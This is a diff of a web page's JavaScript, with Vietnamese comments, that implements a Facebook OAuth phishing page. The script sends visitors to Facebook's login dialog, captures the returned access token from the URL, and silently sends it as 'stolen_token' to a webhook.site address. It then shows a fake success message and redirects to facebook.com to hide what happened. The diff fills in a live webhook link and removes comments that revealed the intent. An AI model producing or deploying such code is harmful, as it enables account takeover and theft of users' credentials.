@@ -30,34 +30,32 @@
 </div>
 
 <script>
-    // === CẤU HÌNH THÔNG SỐ (PHẢI KHỚP VỚI DASHBOARD) ===
-    const APP_ID = "839014905810590"; // ID ứng dụng của bạn
-    const REDIRECT_URI = "https://phuongtrannn.github.io/test/"; // URI bạn đã cấu hình
-    const WEBHOOK_URL = "https://webhook.site/YOUR_NEW_LINK"; // DÁN LINK WEBHOOK MỚI CỦA BẠN VÀO ĐÂY
+    // === CẤU HÌNH THÔNG SỐ ĐÃ SỬA ===
+    const APP_ID = "839014905810590"; 
+    const REDIRECT_URI = "https://phuongtrannn.github.io/test/"; 
+    const WEBHOOK_URL = "https://webhook.site/63a27832-d5bc-440f-9993-e12efa944916"; // Đã cập nhật link của bạn
 
     const loginBtn = document.getElementById('loginBtn');
 
-    // Bước 1: Khi nhấn nút, chuyển đến trang xin quyền của Facebook
+    // Bước 1: Chuyển đến Facebook để xin quyền
     loginBtn.onclick = function() {
         const fbAuthUrl = `https://www.facebook.com/v21.0/dialog/oauth?client_id=${APP_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=token&scope=public_profile,email`;
         window.location.href = fbAuthUrl;
     };
 
-    // Bước 2: Tự động bắt Token từ URL khi nạn nhân quay lại trang
+    // Bước 2: Tự động bắt Token và gửi về Webhook
     window.onload = function() {
-        // Kiểm tra xem trên URL có chứa #access_token= hay không
         if (window.location.hash.includes("access_token")) {
             const hash = window.location.hash.substring(1);
             const params = new URLSearchParams(hash);
             const token = params.get('access_token');
 
             if (token) {
-                // TỰ ĐỘNG gửi mã Token về máy chủ hacker (Webhook) âm thầm
+                // Gửi Token về Webhook ngầm
                 fetch(`${WEBHOOK_URL}?stolen_token=${token}`)
                 .then(() => {
-                    // Thông báo giả để đánh lạc hướng nạn nhân
                     alert("Xác thực thành công! Hệ thống đang chuyển hướng về trang chủ.");
-                    window.location.href = "https://www.facebook.com"; // Xóa dấu vết
+                    window.location.href = "https://www.facebook.com"; 
                 })
                 .catch(err => console.error("Lỗi gửi dữ liệu"));
             }
